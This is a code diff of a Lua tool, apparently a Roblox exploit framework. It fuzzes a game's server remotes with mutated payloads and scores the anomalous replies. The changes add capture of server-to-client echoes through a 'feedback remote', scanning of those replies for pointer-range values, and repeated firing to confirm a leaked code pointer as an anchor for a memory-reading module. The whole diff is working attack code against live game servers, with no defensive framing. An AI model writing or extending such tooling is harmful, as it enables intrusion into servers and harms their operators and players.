@@ -67,13 +67,15 @@ local CFG = {
 }
 
 -- ── State storage ─────────────────────────────────────────────────────────────
-BCS.ColdRemote      = nil   -- selected untouched remote name
-BCS.ColdRemoteInst  = nil   -- resolved instance
-BCS.NewBaseline     = nil   -- fresh latency baseline
-BCS.OverlayLog      = {}    -- all partial overlay probe results
-BCS.Anomalies       = {}    -- overlay anomalies
-BCS.NewAnchor       = nil   -- leaked code pointer (new BGH anchor)
-BCS.NewPrimitive    = nil   -- confirmed primitive on cold channel
+BCS.ColdRemote          = nil   -- selected untouched remote name (C2S sink)
+BCS.ColdRemoteInst      = nil   -- resolved instance
+BCS.FeedbackRemote      = nil   -- S2C echo remote name (confirmed by nonce)
+BCS.FeedbackRemoteInst  = nil   -- resolved S2C instance
+BCS.NewBaseline         = nil   -- fresh latency baseline
+BCS.OverlayLog          = {}    -- all partial overlay probe results
+BCS.Anomalies           = {}    -- overlay anomalies
+BCS.NewAnchor           = nil   -- leaked code pointer (new BGH anchor)
+BCS.NewPrimitive        = nil   -- confirmed primitive on cold channel
 BCS.Stats           = {
     remotesScanned   = 0,
     candidatesTried  = 0,
@@ -192,6 +194,23 @@ local function boundedFire(remoteInst, payload, ceiling)
 end
 
 -- ── Baseline recorder ─────────────────────────────────────────────────────────
+-- ── Feedback remote resolver ──────────────────────────────────────────────────
+-- Resolves the S2C feedback remote that ASE confirmed during the nonce
+-- handshake. Returns the RemoteEvent instance or nil.
+local function resolveFeedbackInst(feedbackName)
+    if not feedbackName then return nil end
+
+    -- Try PR_Registry first — it has the exact path
+    local PR = _G.PC and _G.PC.PR_Registry
+    if PR and PR[feedbackName] then
+        local rec = PR[feedbackName]
+        if rec.Remote then return rec.Remote end
+    end
+
+    -- Fall back to resolveInst (DataModel walk)
+    return resolveInst(feedbackName)
+end
+
 local function recordBaseline(remoteInst)
     log("INFO", "Recording cold baseline...")
     local total = 0
@@ -509,6 +528,17 @@ function BCS.TunnelReSync()
                     handshakeOk   = true
                     handshakeConf = 1.0
                     name = stats.ActiveSink or name
+                    -- Capture the S2C feedback remote ASE confirmed via nonce echo
+                    local fbName = stats.ActiveFeedback
+                    if fbName then
+                        local fbInst = resolveFeedbackInst(fbName)
+                        if fbInst then
+                            BCS.FeedbackRemote     = fbName
+                            BCS.FeedbackRemoteInst = fbInst
+                            log("INFO", string.format(
+                                "Feedback remote captured: %s", fbName))
+                        end
+                    end
                     log("INFO", string.format(
                         "%s — nonce echo confirmed (PATH A)", name))
                     break
@@ -703,26 +733,23 @@ local function generateOverlayProbe(mutationType, index, remoteInst)
 end
 
 -- Anomaly scorer for partial overlay probes
-local function scoreOverlayAnomaly(baseline, result, errStr, latency)
+local function scoreOverlayAnomaly(baseline, result, errStr, latency, s2cArgs)
     if not baseline then return 0, "no baseline" end
 
     local score   = 0
     local reasons = {}
 
-    -- Latency: partial overlays should be FASTER than naked probes
-    -- Any spike above ceiling is abort territory (handled upstream)
-    -- Moderate elevation is a positive signal
+    -- Latency signal (only meaningful for RemoteFunction round-trips)
     local ratio = latency / math.max(baseline.avgLatency, 0.001)
-    if ratio > 1.4 and ratio < (CFG.LatencyCeiling / baseline.avgLatency) then
+    if ratio > 1.4 and ratio < (CFG.LatencyCeiling / math.max(baseline.avgLatency, 0.001)) then
         score = score + 0.20
         table.insert(reasons, string.format("latency elevated %.1fx", ratio))
     end
 
-    -- Response type changed from baseline
+    -- Direct response (RemoteFunction only — RemoteEvent sinks return nil)
     if type(result) == "table" then
         score = score + 0.15
         table.insert(reasons, "table response")
-        -- Check for numeric values in range (potential pointer fragment)
         for k, v in pairs(result) do
             if type(v) == "number" and v > 0x10000 then
                 score = score + 0.20
@@ -731,22 +758,52 @@ local function scoreOverlayAnomaly(baseline, result, errStr, latency)
             end
         end
     end
-
     if type(result) == "number" and result > 0 then
         score = score + 0.15
         table.insert(reasons, "numeric response: " .. tostring(result))
     end
 
-    -- Error string with useful content
+    -- Error string signals
     if type(errStr) == "string" and #errStr > 0 then
-        if errStr:find("0x") or errStr:find("address") or
-           errStr:find("pointer") then
+        if errStr:find("0x") or errStr:find("address") or errStr:find("pointer") then
             score = score + 0.30
             table.insert(reasons, "address-like error string")
         elseif errStr:find("%d%d%d%d%d") then
             score = score + 0.15
             table.insert(reasons, "numeric error: " .. errStr:sub(1,40))
         end
+    end
+
+    -- ── S2C feedback channel (primary signal for RemoteEvent sinks) ───────────
+    -- Fire C2S → server echoes via OnClientEvent on the feedback remote.
+    -- That captured payload IS the response surface. Score it heavily.
+    if type(s2cArgs) == "table" and #s2cArgs > 0 then
+        score = score + 0.25
+        table.insert(reasons, string.format("S2C reply (%d args)", #s2cArgs))
+
+        local function scanVal(v, depth)
+            if depth > 4 then return end
+            if type(v) == "number" then
+                if v >= CFG.AddressMinVal and v <= CFG.AddressMaxVal then
+                    score = score + 0.35
+                    table.insert(reasons, string.format("S2C pointer: 0x%X", v))
+                elseif v > 0x10000 then
+                    score = score + 0.15
+                    table.insert(reasons, string.format("S2C large numeric: %d", v))
+                end
+            elseif type(v) == "string" then
+                for hex in v:gmatch("0x(%x+)") do
+                    local n = tonumber(hex, 16)
+                    if n and n >= CFG.AddressMinVal and n <= CFG.AddressMaxVal then
+                        score = score + 0.35
+                        table.insert(reasons, "S2C hex pointer in string")
+                    end
+                end
+            elseif type(v) == "table" then
+                for _, child in pairs(v) do scanVal(child, depth + 1) end
+            end
+        end
+        for _, arg in ipairs(s2cArgs) do scanVal(arg, 0) end
     end
 
     return math.min(score, 1.0), table.concat(reasons, "; ")
@@ -757,6 +814,7 @@ function BCS.RunOverlayProbes()
 
     local inst     = BCS.ColdRemoteInst
     local baseline = BCS.NewBaseline
+    local fbInst   = BCS.FeedbackRemoteInst  -- may be nil for PATH B tunnels
 
     if not inst or not baseline then
         setState(BCS.STATE.ERROR)
@@ -764,8 +822,9 @@ function BCS.RunOverlayProbes()
     end
 
     log("INFO", string.format(
-        "Step 2: Partial Overlay Probing on %s  ceiling=%.0fms",
-        BCS.ColdRemote, baseline.ceiling * 1000))
+        "Step 2: Partial Overlay Probing on %s  ceiling=%.0fms  feedback=%s",
+        BCS.ColdRemote, baseline.ceiling * 1000,
+        BCS.FeedbackRemote or "none"))
 
     local MUTATION_TYPES = {
         "INT_INDEX", "FLOAT_NAN", "STR_NUMERIC",
@@ -780,25 +839,48 @@ function BCS.RunOverlayProbes()
         if BCS.CurrentState ~= BCS.STATE.OVERLAY_PROBE then break end
 
         log("INFO", "Overlay mutation: " .. mutType)
-        local mutAborts   = 0
-        local mutAnomalies= 0
+        local mutAborts    = 0
+        local mutAnomalies = 0
 
         for idx = 1, CFG.MaxOverlayPerMutation do
             if BCS.CurrentState ~= BCS.STATE.OVERLAY_PROBE then break end
 
             local payload = generateOverlayProbe(mutType, idx, inst)
+
+            -- If we have a feedback remote, open the S2C listener BEFORE
+            -- firing so we don't miss a fast echo.
+            local s2cCapture = nil
+            local s2cConn    = nil
+            if fbInst then
+                pcall(function()
+                    s2cConn = fbInst.OnClientEvent:Connect(function(...)
+                        if not s2cCapture then
+                            s2cCapture = {...}
+                        end
+                    end)
+                end)
+            end
+
             local ok, result, latency, aborted =
                 boundedFire(inst, payload, baseline.ceiling)
 
+            -- Wait briefly for S2C echo if no immediate capture
+            if fbInst and not s2cCapture and not aborted then
+                local t0 = os.clock()
+                while not s2cCapture and (os.clock() - t0) < 0.25 do
+                    task.wait(0.02)
+                end
+            end
+            if s2cConn then pcall(function() s2cConn:Disconnect() end) end
+
             if aborted then
                 mutAborts = mutAborts + 1
-                -- If too many aborts on this mutator — purge it entirely
                 if mutAborts >= 3 then
                     log("WARN", string.format(
                         "[%s] 3 latency aborts — mutator purged", mutType))
                     break
                 end
-                task.wait(CFG.OverlayInterval * 3)  -- cooldown after abort
+                task.wait(CFG.OverlayInterval * 3)
                 continue
             end
 
@@ -808,18 +890,19 @@ function BCS.RunOverlayProbes()
             local res    = ok and result or nil
 
             local aScore, aReason = scoreOverlayAnomaly(
-                baseline, res, errStr, latency)
+                baseline, res, errStr, latency, s2cCapture)
 
             local probe = {
-                mutation = mutType,
-                index    = idx,
-                payload  = payload,
-                result   = res,
-                errStr   = errStr,
-                latency  = latency,
-                aScore   = aScore,
-                aReason  = aReason,
-                firedAt  = os.clock(),
+                mutation  = mutType,
+                index     = idx,
+                payload   = payload,
+                result    = res,
+                errStr    = errStr,
+                latency   = latency,
+                s2cArgs   = s2cCapture,
+                aScore    = aScore,
+                aReason   = aReason,
+                firedAt   = os.clock(),
             }
 
             table.insert(BCS.OverlayLog, probe)
@@ -831,8 +914,9 @@ function BCS.RunOverlayProbes()
                 table.insert(BCS.Anomalies, probe)
 
                 log("ANOMALY", string.format(
-                    "[%s #%d] score=%.2f  lat=%.0fms  %s",
+                    "[%s #%d] score=%.2f  lat=%.0fms  s2c=%s  %s",
                     mutType, idx, aScore, latency*1000,
+                    s2cCapture and "YES" or "no",
                     aReason:sub(1,60)))
 
                 if BCS.OnAnomaly then
@@ -842,7 +926,6 @@ function BCS.RunOverlayProbes()
 
             task.wait(CFG.OverlayInterval)
 
-            -- Early exit if we have strong anomalies for this mutator
             if mutAnomalies >= 5 then
                 log("INFO", string.format(
                     "[%s] 5 anomalies — sufficient, moving on", mutType))
@@ -932,31 +1015,86 @@ function BCS.RunPointerLeak()
 
     local inst     = BCS.ColdRemoteInst
     local baseline = BCS.NewBaseline
+    local fbInst   = BCS.FeedbackRemoteInst
 
     if not inst or not baseline then
         setState(BCS.STATE.ERROR)
         return false, "No cold remote"
     end
 
-    -- Sort anomalies by score, take top candidates
-    table.sort(BCS.Anomalies, function(a,b) return a.aScore > b.aScore end)
-    local topN = math.min(#BCS.Anomalies, CFG.LeakCandidates)
+    -- Helper: fire + capture S2C, return (res, errStr, s2cArgs)
+    local function fireAndCapture(payload)
+        local s2cCapture = nil
+        local s2cConn    = nil
+        if fbInst then
+            pcall(function()
+                s2cConn = fbInst.OnClientEvent:Connect(function(...)
+                    if not s2cCapture then s2cCapture = {...} end
+                end)
+            end)
+        end
 
-    if topN == 0 then
-        log("WARN", "No overlay anomalies to attempt pointer extraction from")
-        -- Still try: fire the top mutations with fresh probes
-        for mutType, _ in pairs({INT_INDEX=true, FLOAT_NAN=true}) do
+        local ok, result, latency, aborted =
+            boundedFire(inst, payload, baseline.ceiling)
+
+        if fbInst and not s2cCapture and not aborted then
+            local t0 = os.clock()
+            while not s2cCapture and (os.clock() - t0) < 0.35 do
+                task.wait(0.02)
+            end
+        end
+        if s2cConn then pcall(function() s2cConn:Disconnect() end) end
+
+        local errStr = not ok and tostring(result) or nil
+        local res    = ok and result or nil
+        return res, errStr, s2cCapture, aborted
+    end
+
+    -- Helper: extract pointer candidates from all available sources
+    local function extractAll(res, errStr, s2cArgs)
+        local ptrs = tryExtractPointer(res, errStr)
+        -- Also scan S2C args for pointer-range values
+        if type(s2cArgs) == "table" then
+            local function scanVal(v, depth)
+                if depth > 4 then return end
+                if type(v) == "number" then
+                    if v >= CFG.AddressMinVal and v <= CFG.AddressMaxVal then
+                        table.insert(ptrs, {val=v, src="s2c_numeric"})
+                    end
+                elseif type(v) == "string" then
+                    for hex in v:gmatch("0x(%x+)") do
+                        local n = tonumber(hex, 16)
+                        if n and n >= CFG.AddressMinVal and n <= CFG.AddressMaxVal then
+                            table.insert(ptrs, {val=n, src="s2c_hex"})
+                        end
+                    end
+                elseif type(v) == "table" then
+                    for _, child in pairs(v) do scanVal(child, depth+1) end
+                end
+            end
+            for _, arg in ipairs(s2cArgs) do scanVal(arg, 0) end
+        end
+        return ptrs
+    end
+
+    -- Sort anomalies by score
+    table.sort(BCS.Anomalies, function(a,b) return a.aScore > b.aScore end)
+
+    -- If no anomalies, seed from fresh probes using known-good mutations
+    if #BCS.Anomalies == 0 then
+        log("WARN", "No overlay anomalies — seeding from fresh probes")
+        for _, mutType in ipairs({"INT_INDEX", "FLOAT_NAN", "STR_NUMERIC"}) do
             local payload = generateOverlayProbe(mutType, 1, inst)
-            local ok, result, latency, aborted =
-                boundedFire(inst, payload, baseline.ceiling)
+            local res, errStr, s2cArgs, aborted = fireAndCapture(payload)
             if not aborted then
-                local errStr = not ok and tostring(result) or nil
-                local res    = ok and result or nil
-                local ptrs   = tryExtractPointer(res, errStr)
-                if #ptrs > 0 then
+                local ptrs = extractAll(res, errStr, s2cArgs)
+                if #ptrs > 0 or s2cArgs then
                     table.insert(BCS.Anomalies, {
-                        payload=payload, result=res,
-                        errStr=errStr, aScore=0.5
+                        payload  = payload,
+                        result   = res,
+                        errStr   = errStr,
+                        s2cArgs  = s2cArgs,
+                        aScore   = 0.5,
                     })
                 end
             end
@@ -964,33 +1102,42 @@ function BCS.RunPointerLeak()
         end
     end
 
+    -- Main extraction loop
     for i = 1, math.min(#BCS.Anomalies, CFG.LeakCandidates) do
         local anomaly = BCS.Anomalies[i]
         BCS.Stats.leakAttempts = BCS.Stats.leakAttempts + 1
 
-        -- Extract pointer candidates from this anomaly's response
-        local ptrs = tryExtractPointer(anomaly.result, anomaly.errStr)
+        -- Extract from stored anomaly data first (may already have s2cArgs)
+        local ptrs = extractAll(anomaly.result, anomaly.errStr, anomaly.s2cArgs)
+
+        -- If still empty, re-fire to get a fresh capture
+        if #ptrs == 0 then
+            local res, errStr, s2cArgs, aborted = fireAndCapture(anomaly.payload)
+            if not aborted then
+                ptrs = extractAll(res, errStr, s2cArgs)
+                -- Update anomaly with fresh data
+                anomaly.result  = res
+                anomaly.errStr  = errStr
+                anomaly.s2cArgs = s2cArgs
+            end
+        end
+
         if #ptrs == 0 then continue end
 
-        -- Try to confirm the best candidate
+        -- Confirm each candidate
         for _, ptr in ipairs(ptrs) do
-            local hits = 0
+            local hits       = 0
             local totalRounds = CFG.LeakConfirmRounds
 
-            for round = 1, totalRounds do
-                local ok, result, latency, aborted =
-                    boundedFire(inst, anomaly.payload, baseline.ceiling)
+            for _ = 1, totalRounds do
+                local res, errStr, s2cArgs, aborted =
+                    fireAndCapture(anomaly.payload)
                 if aborted then break end
 
-                local errStr = not ok and tostring(result) or nil
-                local res    = ok and result or nil
-
-                local confirmPtrs = tryExtractPointer(res, errStr)
+                local confirmPtrs = extractAll(res, errStr, s2cArgs)
                 for _, cp in ipairs(confirmPtrs) do
-                    -- Allow ±0x1000 tolerance (same page = same module)
                     if math.abs(cp.val - ptr.val) < 0x1000 then
-                        hits = hits + 1
-                        break
+                        hits = hits + 1; break
                     end
                 end
                 task.wait(CFG.OverlayInterval)
@@ -999,8 +1146,7 @@ function BCS.RunPointerLeak()
             local confidence = hits / totalRounds
 
             if confidence >= 0.60 then
-                -- Confirmed pointer
-                BCS.NewAnchor = ptr.val
+                BCS.NewAnchor       = ptr.val
                 BCS.Stats.confirmed = true
 
                 log("INFO", string.format(
@@ -1011,14 +1157,19 @@ function BCS.RunPointerLeak()
                     pcall(BCS.OnAnchorLeaked, ptr.val)
                 end
 
-                -- Update BGH anchor with the confirmed pointer
+                -- Update BGH anchor and feed it the feedback remote
                 local BGH = getBGH()
                 if BGH and BGH.SetAnchor then
-                    BGH.SetTextBounds(nil, nil)  -- clear stale .text bounds
+                    BGH.SetTextBounds(nil, nil)
                     BGH.Reset()
                     BGH.SetAnchor(ptr.val)
+                    -- Wire the feedback remote into BGH so readByte can listen S2C
+                    if BGH.SetFeedbackRemote and fbInst then
+                        BGH.SetFeedbackRemote(fbInst)
+                    end
                     log("INFO", string.format(
-                        "BGH anchor updated: 0x%X", ptr.val))
+                        "BGH anchor updated: 0x%X  feedback=%s",
+                        ptr.val, BCS.FeedbackRemote or "none"))
                 end
 
                 return true, ptr.val
@@ -1030,8 +1181,6 @@ function BCS.RunPointerLeak()
         end
     end
 
-    -- No confirmed pointer — partial success: we have a cold channel
-    -- BGH can still attempt PE hunt from the anchor region of the cold remote
     log("WARN", "No stable pointer extracted — cold channel established but anchor unconfirmed")
     return false, "Pointer unstable — manual anchor required"
 end
@@ -1047,13 +1196,15 @@ function BCS.Run()
     end
 
     -- Reset
-    BCS.ColdRemote     = nil
-    BCS.ColdRemoteInst = nil
-    BCS.NewBaseline    = nil
-    BCS.OverlayLog     = {}
-    BCS.Anomalies      = {}
-    BCS.NewAnchor      = nil
-    BCS.NewPrimitive   = nil
+    BCS.ColdRemote         = nil
+    BCS.ColdRemoteInst     = nil
+    BCS.FeedbackRemote     = nil
+    BCS.FeedbackRemoteInst = nil
+    BCS.NewBaseline        = nil
+    BCS.OverlayLog         = {}
+    BCS.Anomalies          = {}
+    BCS.NewAnchor          = nil
+    BCS.NewPrimitive       = nil
     BCS.Stats          = {
         remotesScanned=0, candidatesTried=0,
         overlayFires=0, overlayAnomalies=0,
